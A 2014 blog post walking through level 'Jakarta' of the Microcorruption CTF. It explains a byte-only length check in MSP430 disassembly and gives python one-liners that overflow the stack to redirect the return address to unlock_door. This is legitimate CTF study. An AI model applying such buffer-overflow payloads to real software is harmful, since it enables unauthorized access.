---
layout: post
title: "Microcorruption CTF - Part II"
date: 2014-04-21 22:51:26 +0300
comments: true
categories: 
---

Introduction
------------
This is the second post about the [microcorruption CTF](https://microcorruption.com). For the previous post click [here](http://idosch.org/blog/2014/04/18/microcorruption-ctf-part-i/).

Level 10: Jakarta
-----------------
"Zero bottles of beer on the wall, zero bottles of beer; take one down, pass it around, 65535 bottles of beer on the wall."

This quote says it all, but I'll explain anyway. Here the HSM 1 is back so we already know what we need to do: make the notorious `login` return to `unlock_door`. However, as always, there is a catch. Both a user name and a password should be entered and their combined length needs to be no more than 31 bytes, which is of course less than the number of bytes needed to overwrite the return address. Below are snippets from `login` with my remarks.

At this stage you already entered your user name and its length is stored in `r11`. The following code subtracts your user name's length from `0x1f` (31), stores the result in `r14` and use it to read that much bytes from the user as its password using `getsn`.
```
45c8:  3e40 1f00      mov   #0x1f, r14
45cc:  0e8b           sub   r11, r14
45ce:  3ef0 ff01      and   #0x1ff, r14
45d2:  3f40 0224      mov   #0x2402, r15
45d6:  b012 b846      call  #0x46b8 <getsn>
```

After entering a password its length will be stored in `r15` with the user name length still in `r11`. Therefore, what the following code does is making sure the combined length is no more than 33 bytes, thereby, supposedly preventing us from overwriting the return address. Looking closer you may notice that the above statement is not accurate, as this is a `cmp.b` instruction that only checks the lower byte of the word and not all of it.
```
45fe:  0f5b           add   r11, r15
4600:  7f90 2100      cmp.b #0x21, r15
4604:  0628           jnc   #0x4612 <login+0xb2>
```

Knowing all this and keeping in mind the quote from the beginning, the rest should be pretty clear. We begin by entering a user name`0x20` bytes long, as this will cause `r14` to become `0xffff` (-1) in `0x45cc`, thereby allowing us to enter a password of up to `0x1ff` bytes.

```
$ python2 -c "print '41'*32" | xclip -i
```
Assuming the above user name was entered, the stack should look like this before a password is entered:

```
3fe0:   0000 0000 7846 0300 ec46 0000 0a00 2000   ....xF...F.... .
3ff0:   c845 4141 4141 4141 4141 4141 4141 4141   .EAAAAAAAAAAAAAA
4000:   4141 4141 4141 4141 4141 4141 4141 4141   AAAAAAAAAAAAAAAA
4010:   4141 0000 0000 4044 0000 0000 0000 0000   AA....@D........
```

with the return address (`0x4440`) at `0x4016`. Keeping in mind that we already entered `0x20` bytes and that the lower byte of the combined length needs to be less than `0x22`, we need a password of length `0xe0` as the combined length will be `0xe0+0x20=0x100`. Thus, the following password is used:
```
$ python2 -c "print '41'*4 + '4c44' + '41'*218" | xclip -i
```

Where the first four bytes simply fill the space between the end of the user name and the start of the return address and the next two bytes are the address of `unlock_door` (`0x444c`).
